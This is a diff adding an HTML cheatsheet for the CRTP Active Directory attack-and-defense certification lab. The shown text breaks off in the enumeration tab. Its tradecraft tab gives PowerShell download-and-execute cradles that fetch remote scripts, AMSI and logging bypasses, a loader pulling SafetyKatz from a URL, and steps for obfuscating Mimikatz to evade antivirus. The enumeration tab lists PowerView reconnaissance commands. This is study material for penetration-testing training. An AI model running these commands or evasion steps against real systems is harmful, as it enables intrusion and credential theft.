@@ -1,0 +1,1815 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CRTP Cheatsheet — Attacking & Defending Active Directory</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;700;800&family=IBM+Plex+Sans:ital,wght@0,300;0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e1a;
+  --bg2: #0f1424;
+  --bg3: #141929;
+  --panel: #1a2035;
+  --panel2: #1e2540;
+  --border: #252d45;
+  --border2: #2e3859;
+  --text: #e2e8f0;
+  --text2: #94a3b8;
+  --text3: #64748b;
+  --accent: #38bdf8;
+  --accent2: #0ea5e9;
+  --accent3: #7dd3fc;
+  --green: #4ade80;
+  --green2: #22c55e;
+  --red: #f87171;
+  --red2: #ef4444;
+  --orange: #fb923c;
+  --orange2: #f97316;
+  --purple: #c084fc;
+  --purple2: #a855f7;
+  --yellow: #fbbf24;
+  --cyan: #22d3ee;
+  --pink: #f472b6;
+  --code-bg: #0d1117;
+  --code-border: #1e2940;
+  --tab-h: 52px;
+  --sidebar-w: 240px;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'IBM Plex Sans', sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  overflow-x: hidden;
+  min-width: 320px;
+}
+
+/* ── HEADER ── */
+.header {
+  background: linear-gradient(135deg, #0a0e1a 0%, #0f1832 50%, #0a1628 100%);
+  border-bottom: 1px solid var(--border2);
+  padding: 18px 32px 0;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+
+.header-top {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  margin-bottom: 16px;
+}
+
+.logo-badge {
+  background: linear-gradient(135deg, var(--accent2), var(--purple2));
+  color: #fff;
+  font-family: 'Syne', sans-serif;
+  font-weight: 800;
+  font-size: 13px;
+  letter-spacing: 2px;
+  padding: 5px 12px;
+  border-radius: 4px;
+  text-transform: uppercase;
+}
+
+.header-title {
+  font-family: 'Syne', sans-serif;
+  font-weight: 800;
+  font-size: 20px;
+  color: var(--text);
+  letter-spacing: -0.3px;
+}
+
+.header-title span { color: var(--accent); }
+
+.header-meta {
+  margin-left: auto;
+  font-size: 12px;
+  color: var(--text3);
+  font-family: 'JetBrains Mono', monospace;
+}
+
+.search-wrap {
+  position: relative;
+  width: 280px;
+  margin-left: auto;
+}
+
+.search-wrap input {
+  width: 100%;
+  background: var(--panel);
+  border: 1px solid var(--border2);
+  border-radius: 6px;
+  color: var(--text);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  padding: 7px 12px 7px 34px;
+  outline: none;
+  transition: border-color .2s;
+}
+
+.search-wrap input:focus { border-color: var(--accent); }
+.search-wrap input::placeholder { color: var(--text3); }
+
+.search-icon {
+  position: absolute;
+  left: 10px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: var(--text3);
+  font-size: 13px;
+}
+
+/* ── TABS ── */
+.tabs {
+  display: flex;
+  gap: 2px;
+  overflow-x: auto;
+  scrollbar-width: none;
+  padding-top: 2px;
+}
+
+.tabs::-webkit-scrollbar { display: none; }
+
+.tab-btn {
+  background: none;
+  border: none;
+  border-bottom: 3px solid transparent;
+  color: var(--text3);
+  cursor: pointer;
+  font-family: 'Syne', sans-serif;
+  font-size: 12px;
+  font-weight: 600;
+  letter-spacing: .5px;
+  padding: 10px 16px 8px;
+  text-transform: uppercase;
+  white-space: nowrap;
+  transition: all .2s;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.tab-btn:hover { color: var(--text2); border-bottom-color: var(--border2); }
+
+.tab-btn.active {
+  color: var(--accent);
+  border-bottom-color: var(--accent);
+}
+
+.tab-dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: currentColor;
+  opacity: .6;
+}
+
+/* ── MAIN LAYOUT ── */
+.main {
+  display: flex;
+  min-height: calc(100vh - var(--tab-h) - 72px);
+}
+
+/* ── CONTENT ── */
+.content {
+  flex: 1;
+  padding: 28px 32px;
+  max-width: 100%;
+}
+
+.tab-panel { display: none; }
+.tab-panel.active { display: block; }
+
+/* ── SECTION HEADERS ── */
+.section-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 22px;
+  font-weight: 800;
+  color: var(--text);
+  margin-bottom: 6px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.section-title .icon {
+  font-size: 20px;
+}
+
+.section-subtitle {
+  color: var(--text3);
+  font-size: 13px;
+  margin-bottom: 24px;
+  padding-bottom: 16px;
+  border-bottom: 1px solid var(--border);
+}
+
+/* ── GRID LAYOUTS ── */
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px; }
+.grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; margin-bottom: 16px; }
+.grid-auto { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 16px; margin-bottom: 16px; }
+
+@media (max-width: 1100px) {
+  .grid-3 { grid-template-columns: 1fr 1fr; }
+}
+
+@media (max-width: 800px) {
+  .grid-2, .grid-3 { grid-template-columns: 1fr; }
+
+  .header { padding: 12px 16px 0; }
+
+  .header-top { flex-wrap: wrap; gap: 8px; }
+
+  .header-title { font-size: 15px; }
+
+  .search-wrap { width: 100%; margin-left: 0; order: 3; }
+
+  .content { padding: 16px; }
+
+  .section-title { font-size: 18px; }
+
+  .ref-table { font-size: 11.5px; display: block; overflow-x: auto; }
+  .ref-table th, .ref-table td { padding: 6px 8px; }
+}
+
+/* ── CARDS ── */
+.card {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 18px;
+  transition: border-color .2s;
+  overflow: hidden;
+  min-width: 0;
+}
+
+.card:hover { border-color: var(--border2); }
+
+.card-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 13px;
+  font-weight: 700;
+  letter-spacing: .5px;
+  text-transform: uppercase;
+  color: var(--text2);
+  margin-bottom: 12px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.card-title .tag {
+  font-size: 10px;
+  padding: 2px 7px;
+  border-radius: 3px;
+  font-weight: 600;
+  letter-spacing: .5px;
+}
+
+.tag-red { background: rgba(248,113,113,.15); color: var(--red); }
+.tag-green { background: rgba(74,222,128,.15); color: var(--green); }
+.tag-blue { background: rgba(56,189,248,.15); color: var(--accent); }
+.tag-orange { background: rgba(251,146,60,.15); color: var(--orange); }
+.tag-purple { background: rgba(192,132,252,.15); color: var(--purple); }
+.tag-cyan { background: rgba(34,211,238,.15); color: var(--cyan); }
+.tag-yellow { background: rgba(251,191,36,.15); color: var(--yellow); }
+
+/* ── CODE BLOCKS ── */
+.cmd {
+  background: var(--code-bg);
+  border: 1px solid var(--code-border);
+  border-left: 3px solid var(--accent2);
+  border-radius: 0 6px 6px 0;
+  color: #e6edf3;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  padding: 9px 52px 9px 12px;
+  margin: 5px 0;
+  position: relative;
+  overflow-x: auto;
+  white-space: pre-wrap;
+  word-break: break-all;
+  cursor: pointer;
+  transition: border-left-color .15s, background .15s;
+}
+
+.cmd:hover { background: #111827; border-left-color: var(--accent); }
+.cmd.copied { border-left-color: var(--green); background: rgba(74,222,128,.05); }
+
+.cmd .comment { color: #6e7681; }
+.cmd .keyword { color: var(--accent3); }
+.cmd .param { color: var(--orange); }
+.cmd .string { color: var(--green); }
+.cmd .flag { color: var(--purple); }
+.cmd .tool { color: var(--yellow); }
+.cmd .value { color: var(--pink); }
+
+.copy-hint {
+  position: absolute;
+  right: 6px;
+  top: 6px;
+  transform: none;
+  font-size: 10px;
+  color: var(--text3);
+  opacity: 0;
+  transition: opacity .2s;
+  font-family: 'IBM Plex Sans', sans-serif;
+  background: var(--panel2);
+  padding: 2px 6px;
+  border-radius: 3px;
+  pointer-events: none;
+  white-space: nowrap;
+}
+
+.cmd:hover .copy-hint { opacity: 1; }
+.cmd.copied .copy-hint { opacity: 1; color: var(--green); content: "Copied!"; }
+
+/* ── TABLES ── */
+.table-wrap {
+  overflow-x: auto;
+  width: 100%;
+}
+
+.ref-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 12.5px;
+  margin: 8px 0;
+  min-width: 400px;
+}
+
+.ref-table th {
+  background: var(--panel2);
+  color: var(--accent);
+  font-family: 'Syne', sans-serif;
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: .8px;
+  padding: 8px 12px;
+  text-align: left;
+  text-transform: uppercase;
+  border-bottom: 1px solid var(--border2);
+}
+
+.ref-table td {
+  padding: 8px 12px;
+  border-bottom: 1px solid var(--border);
+  vertical-align: top;
+}
+
+.ref-table tr:last-child td { border-bottom: none; }
+.ref-table tr:hover td { background: rgba(56,189,248,.04); }
+
+.ref-table td:first-child {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11.5px;
+  color: var(--yellow);
+  white-space: normal;
+  word-break: break-all;
+  max-width: 260px;
+}
+
+.ref-table td:last-child { color: var(--text2); }
+
+/* ── ALERT BOXES ── */
+.alert {
+  border-radius: 7px;
+  padding: 10px 14px;
+  margin: 10px 0;
+  font-size: 12.5px;
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+}
+
+.alert-icon { font-size: 14px; flex-shrink: 0; margin-top: 1px; }
+.alert-content { flex: 1; }
+.alert-title { font-weight: 600; margin-bottom: 2px; }
+
+.alert-red { background: rgba(248,113,113,.1); border: 1px solid rgba(248,113,113,.25); color: #fca5a5; }
+.alert-green { background: rgba(74,222,128,.1); border: 1px solid rgba(74,222,128,.25); color: #86efac; }
+.alert-orange { background: rgba(251,146,60,.1); border: 1px solid rgba(251,146,60,.25); color: #fdba74; }
+.alert-blue { background: rgba(56,189,248,.1); border: 1px solid rgba(56,189,248,.25); color: #7dd3fc; }
+.alert-purple { background: rgba(192,132,252,.1); border: 1px solid rgba(192,132,252,.25); color: #d8b4fe; }
+
+/* ── STEPS ── */
+.steps { counter-reset: step; }
+.step {
+  display: flex;
+  gap: 14px;
+  margin-bottom: 14px;
+  align-items: flex-start;
+}
+
+.step-num {
+  background: linear-gradient(135deg, var(--accent2), var(--purple2));
+  border-radius: 50%;
+  color: #fff;
+  flex-shrink: 0;
+  font-family: 'Syne', sans-serif;
+  font-size: 11px;
+  font-weight: 800;
+  height: 24px;
+  width: 24px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-top: 2px;
+}
+
+.step-content { flex: 1; }
+.step-label { font-weight: 600; color: var(--text); margin-bottom: 4px; font-size: 13px; }
+
+/* ── PILLS ── */
+.pills { display: flex; flex-wrap: wrap; gap: 6px; margin: 8px 0; }
+.pill {
+  background: var(--panel2);
+  border: 1px solid var(--border2);
+  border-radius: 100px;
+  color: var(--text2);
+  font-size: 11.5px;
+  padding: 3px 10px;
+  font-family: 'JetBrains Mono', monospace;
+}
+
+/* ── ATTACK CHAIN ── */
+.chain {
+  display: flex;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 4px;
+  margin: 12px 0;
+}
+
+.chain-item {
+  background: var(--panel2);
+  border: 1px solid var(--border2);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 12px;
+  font-weight: 600;
+  padding: 6px 12px;
+  white-space: normal;
+  word-break: break-word;
+  max-width: 180px;
+  text-align: center;
+}
+
+.chain-item.highlight {
+  background: linear-gradient(135deg, rgba(56,189,248,.2), rgba(168,85,247,.2));
+  border-color: var(--accent2);
+  color: var(--accent3);
+}
+
+.chain-arrow { color: var(--text3); font-size: 14px; }
+
+/* ── QUICK REF BADGE ── */
+.qr-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+  background: var(--panel2);
+  border: 1px solid var(--border2);
+  border-radius: 6px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  padding: 3px 8px;
+  color: var(--text3);
+}
+
+/* ── DIVIDER ── */
+.divider { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
+
+/* ── SID HIGHLIGHT ── */
+.sid { color: var(--cyan); font-family: 'JetBrains Mono', monospace; font-size: 11.5px; }
+
+/* ── EVENT ID ── */
+.eid {
+  display: inline-block;
+  background: rgba(251,191,36,.15);
+  border: 1px solid rgba(251,191,36,.3);
+  color: var(--yellow);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  font-weight: 700;
+  padding: 1px 7px;
+  border-radius: 4px;
+}
+
+/* ── SCROLLBAR ── */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: var(--bg2); }
+::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--text3); }
+
+/* ── HIGHLIGHT MATCH ── */
+.highlight-match { background: rgba(251,191,36,.3); border-radius: 2px; }
+
+/* ── ANIMATE IN ── */
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(12px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.tab-panel.active .card { animation: fadeUp .3s ease both; }
+.tab-panel.active .card:nth-child(1) { animation-delay: .03s; }
+.tab-panel.active .card:nth-child(2) { animation-delay: .06s; }
+.tab-panel.active .card:nth-child(3) { animation-delay: .09s; }
+.tab-panel.active .card:nth-child(4) { animation-delay: .12s; }
+.tab-panel.active .card:nth-child(5) { animation-delay: .15s; }
+
+.progress-bar {
+  height: 2px;
+  background: linear-gradient(90deg, var(--accent2), var(--purple2));
+  position: fixed;
+  top: 0; left: 0;
+  z-index: 999;
+  transition: width .1s;
+}
+</style>
+</head>
+<body>
+
+<div class="progress-bar" id="prog"></div>
+
+<div class="header">
+  <div class="header-top">
+    <div class="logo-badge">CRTP</div>
+    <div class="header-title">Active Directory <span>Attack & Defense</span> Cheatsheet</div>
+    <div class="search-wrap">
+      <span class="search-icon">⌕</span>
+      <input type="text" id="searchInput" placeholder="Search commands..." oninput="doSearch(this.value)">
+    </div>
+  </div>
+  <div class="tabs" id="tabBar">
+    <button class="tab-btn active" onclick="switchTab(0)" data-tab="0"><span class="tab-dot"></span>Tradecraft</button>
+    <button class="tab-btn" onclick="switchTab(1)" data-tab="1"><span class="tab-dot"></span>Enumeration</button>
+    <button class="tab-btn" onclick="switchTab(2)" data-tab="2"><span class="tab-dot"></span>Local PrivEsc</button>
+    <button class="tab-btn" onclick="switchTab(3)" data-tab="3"><span class="tab-dot"></span>Lateral Movement</button>
+    <button class="tab-btn" onclick="switchTab(4)" data-tab="4"><span class="tab-dot"></span>Kerberos Attacks</button>
+    <button class="tab-btn" onclick="switchTab(5)" data-tab="5"><span class="tab-dot"></span>Domain Persistence</button>
+    <button class="tab-btn" onclick="switchTab(6)" data-tab="6"><span class="tab-dot"></span>Cross Trust</button>
+    <button class="tab-btn" onclick="switchTab(7)" data-tab="7"><span class="tab-dot"></span>AD CS</button>
+    <button class="tab-btn" onclick="switchTab(8)" data-tab="8"><span class="tab-dot"></span>MSSQL Abuse</button>
+    <button class="tab-btn" onclick="switchTab(9)" data-tab="9"><span class="tab-dot"></span>MDE/MDI Bypass</button>
+    <button class="tab-btn" onclick="switchTab(10)" data-tab="10"><span class="tab-dot"></span>Defense</button>
+    <button class="tab-btn" onclick="switchTab(11)" data-tab="11"><span class="tab-dot"></span>Quick Ref</button>
+  </div>
+</div>
+
+<div class="main">
+<div class="content">
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- TAB 0: TRADECRAFT -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div class="tab-panel active" id="tab-0">
+  <div class="section-title"><span class="icon">⚔️</span> Offensive Tradecraft</div>
+  <div class="section-subtitle">PowerShell security, AV bypass, payload delivery — stay in-memory, abuse functionality</div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">Execution Policy Bypass <span class="tag tag-blue">PS</span></div>
+      <div class="cmd"><span class="tool">powershell</span> <span class="flag">-ExecutionPolicy bypass</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">powershell</span> <span class="flag">-c</span> <span class="string">&lt;cmd&gt;</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">powershell</span> <span class="flag">-encodedcommand</span> <span class="string">&lt;base64&gt;</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="param">$env:PSExecutionPolicyPreference</span><span class="keyword">="bypass"</span><span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Invisi-Shell <span class="tag tag-green">Bypass Logging</span></div>
+      <div class="alert alert-blue"><span class="alert-icon">ℹ️</span><div>Hooks System.Management.Automation.dll via CLR Profiler to bypass transcription, script block logging &amp; AMSI</div></div>
+      <div class="cmd"><span class="comment"># With admin privileges:</span>
+<span class="tool">RunWithPathAsAdmin.bat</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Without admin:</span>
+<span class="tool">RunWithRegistryNonAdmin.bat</span><span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">AMSI / AV Bypass Workflow <span class="tag tag-orange">AMSI</span></div>
+      <div class="steps">
+        <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-label">Scan with AMSITrigger</div><div class="cmd"><span class="tool">AmsiTrigger_x64.exe</span> <span class="flag">-i</span> script.ps1<span class="copy-hint">click to copy</span></div></div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-label">Modify detected snippet (reverse strings, obfuscate)</div></div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-content"><div class="step-label">Rescan until AMSI_RESULT_NOT_DETECTED</div></div></div>
+        <div class="step"><div class="step-num">4</div><div class="step-content"><div class="step-label">Verify with DefenderCheck</div><div class="cmd"><span class="tool">DefenderCheck.exe</span> PowerUp.ps1<span class="copy-hint">click to copy</span></div></div></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Download-Execute Cradles</div>
+      <div class="cmd"><span class="keyword">iex</span> (<span class="tool">New-Object Net.WebClient</span>).DownloadString(<span class="string">'http://server/p.ps1'</span>)<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># PSv3+</span>
+<span class="keyword">iex</span> (<span class="keyword">iwr</span> <span class="string">'http://server/payload.ps1'</span>)<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="param">$h</span>=<span class="tool">New-Object -ComObject Msxml2.XMLHTTP</span>
+<span class="param">$h</span>.open(<span class="string">'GET'</span>,<span class="string">'http://server/p.ps1'</span>,<span class="keyword">$false</span>)
+<span class="param">$h</span>.send(); <span class="keyword">iex</span> <span class="param">$h</span>.responseText<span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">NetLoader — Payload Delivery <span class="tag tag-purple">AV Bypass</span></div>
+      <div class="alert alert-green"><span class="alert-icon">✅</span><div>Patches AMSI &amp; ETW at runtime. Loads binary from filepath or URL. Use with CsWhispers for D/Invoke + indirect syscalls to evade import table analysis.</div></div>
+      <div class="cmd"><span class="tool">Loader.exe</span> <span class="flag">-path</span> <span class="string">http://172.16.100.X/SafetyKatz.exe</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># ConfuserEx obfuscation (maximum preset):</span>
+<span class="tool">ConfuserEx</span> → Add Release folder → Settings → Rule (Maximum) → Protect<span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Loading Tools Into Memory</div>
+      <div class="cmd"><span class="comment"># Dot sourcing (PowerView):</span>
+. <span class="string">C:\AD\Tools\PowerView.ps1</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Import AD Module:</span>
+<span class="keyword">Import-Module</span> <span class="string">C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># List all module commands:</span>
+<span class="keyword">Get-Command</span> <span class="flag">-Module</span> &lt;modulename&gt;<span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-bottom:16px">
+    <div class="card-title">Invoke-Mimikatz AV Bypass Checklist <span class="tag tag-red">Heavy Sig</span></div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:6px">
+      <div><div style="color:var(--text3);font-size:12px;margin-bottom:4px">Required Modifications:</div>
+        <div class="alert alert-orange" style="margin:3px 0;padding:7px 10px;font-size:12px"><span class="alert-icon">1</span> Remove default embedded comments</div>
+        <div class="alert alert-orange" style="margin:3px 0;padding:7px 10px;font-size:12px"><span class="alert-icon">2</span> Rename script + functions (Invoke-Mimi)</div>
+        <div class="alert alert-orange" style="margin:3px 0;padding:7px 10px;font-size:12px"><span class="alert-icon">3</span> Modify Win32 API variable names (VirtualProtect, CreateRemoteThread)</div>
+        <div class="alert alert-orange" style="margin:3px 0;padding:7px 10px;font-size:12px"><span class="alert-icon">4</span> Rebuild PowerKatz DLL + obfuscate with ProtectMyTooling</div>
+      </div>
+      <div>
+        <div class="alert alert-orange" style="margin:3px 0;padding:7px 10px;font-size:12px"><span class="alert-icon">5</span> Reverse PEBytes string → static sig bypass</div>
+        <div class="alert alert-orange" style="margin:3px 0;padding:7px 10px;font-size:12px"><span class="alert-icon">6</span> Add VMware/VirtualBox sandbox check</div>
+        <div class="alert alert-orange" style="margin:3px 0;padding:7px 10px;font-size:12px"><span class="alert-icon">7</span> Remove Reflective PE warnings</div>
+        <div class="alert alert-orange" style="margin:3px 0;padding:7px 10px;font-size:12px"><span class="alert-icon">8</span> Obfuscate command strings (split/concat vars)</div>
+        <div class="alert alert-orange" style="margin:3px 0;padding:7px 10px;font-size:12px"><span class="alert-icon">9</span> Final DefenderCheck scan</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- TAB 1: ENUMERATION -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div class="tab-panel" id="tab-1">
+  <div class="section-title"><span class="icon">🔍</span> Domain Enumeration</div>
+  <div class="section-subtitle">PowerView · AD Module · BloodHound · SOAPHound — map everything before attacking</div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">Domain Info <span class="tag tag-blue">PowerView</span></div>
+      <div class="cmd"><span class="tool">Get-Domain</span>                         <span class="comment"># current domain</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-Domain</span> <span class="flag">-Domain</span> moneycorp.local<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainSID</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainPolicyData</span>               <span class="comment"># domain policy</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainController</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainController</span> <span class="flag">-Domain</span> moneycorp.local<span class="copy-hint">click to copy</span></div>
+      <hr class="divider">
+      <div class="card-title" style="margin-top:4px">AD Module Equivalents <span class="tag tag-green">AD Module</span></div>
+      <div class="cmd"><span class="tool">Get-ADDomain</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd">(<span class="tool">Get-ADDomain</span>).DomainSID<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-ADDomainController</span><span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Users</div>
+      <div class="cmd"><span class="tool">Get-DomainUser</span>                      <span class="comment"># all users</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainUser</span> <span class="flag">-Identity</span> student1 <span class="flag">-Properties</span> *<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainUser</span> <span class="flag">-Properties</span> samaccountname,logonCount<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Search description field:</span>
+<span class="tool">Get-DomainUser</span> <span class="flag">-LDAPFilter</span> <span class="string">"Description=*built*"</span> | <span class="keyword">Select</span> name,Description<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-ADUser</span> <span class="flag">-Filter</span> * <span class="flag">-Properties</span> *<span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">Computers</div>
+      <div class="cmd"><span class="tool">Get-DomainComputer</span> | <span class="keyword">select</span> Name<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainComputer</span> <span class="flag">-OperatingSystem</span> <span class="string">"*Server 2022*"</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainComputer</span> <span class="flag">-Ping</span>           <span class="comment"># ping alive</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-ADComputer</span> <span class="flag">-Filter</span> * <span class="flag">-Properties</span> *<span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Groups & Members</div>
+      <div class="cmd"><span class="tool">Get-DomainGroup</span> *admin*               <span class="comment"># groups with 'admin'</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainGroupMember</span> <span class="flag">-Identity</span> <span class="string">"Domain Admins"</span> <span class="flag">-Recurse</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainGroup</span> <span class="flag">-UserName</span> <span class="string">"student1"</span>  <span class="comment"># user's groups</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-NetLocalGroup</span> <span class="flag">-ComputerName</span> dcorp-dc<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-NetLocalGroupMember</span> <span class="flag">-ComputerName</span> dcorp-dc <span class="flag">-GroupName</span> Administrators<span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">Sessions & Logged-On Users</div>
+      <div class="cmd"><span class="tool">Get-NetLoggedon</span> <span class="flag">-ComputerName</span> dcorp-adminsrv   <span class="comment"># needs local admin</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-LoggedonLocal</span> <span class="flag">-ComputerName</span> dcorp-adminsrv  <span class="comment"># Remote Registry</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-LastLoggedOn</span> <span class="flag">-ComputerName</span> dcorp-adminsrv<span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Shares & Files</div>
+      <div class="cmd"><span class="tool">Invoke-ShareFinder</span> <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Invoke-FileFinder</span> <span class="flag">-Verbose</span>           <span class="comment"># sensitive files</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-NetFileServer</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># PowerHuntShares (HTML report):</span>
+<span class="tool">Invoke-HuntSMBShares</span> <span class="flag">-NoPing -OutputDirectory</span> C:\AD\Tools <span class="flag">-HostList</span> servers.txt<span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">GPO & OU</div>
+      <div class="cmd"><span class="tool">Get-DomainGPO</span>                       <span class="comment"># all GPOs</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainGPO</span> <span class="flag">-ComputerIdentity</span> dcorp-student1<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainGPOLocalGroup</span>              <span class="comment"># GPOs using Restricted Groups</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainGPOComputerLocalGroupMapping</span> <span class="flag">-ComputerIdentity</span> dcorp-student1<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainOU</span>                         <span class="comment"># all OUs</span><span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">ACLs</div>
+      <div class="cmd"><span class="tool">Get-DomainObjectAcl</span> <span class="flag">-SamAccountName</span> student1 <span class="flag">-ResolveGUIDs</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-DomainObjectAcl</span> <span class="flag">-SearchBase</span> <span class="string">"LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local"</span> <span class="flag">-ResolveGUIDs</span> <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Find-InterestingDomainAcl</span> <span class="flag">-ResolveGUIDs</span> <span class="comment"># find interesting ACEs</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="tool">Get-PathAcl</span> <span class="flag">-Path</span> <span class="string">"\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"</span><span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">Trusts</div>
+      <table class="ref-table" style="margin-bottom:10px">
+        <tr><th>Type</th><th>Properties</th></tr>
+        <tr><td>Parent-Child</td><td>Auto, 2-way transitive, within forest</td></tr>
+        <tr><td>Tree-Root</td><td>Auto, 2-way transitive, new tree in forest</td></tr>
+        <tr><td>External</td><td>Manual, non-transitive, cross-forest</td></tr>
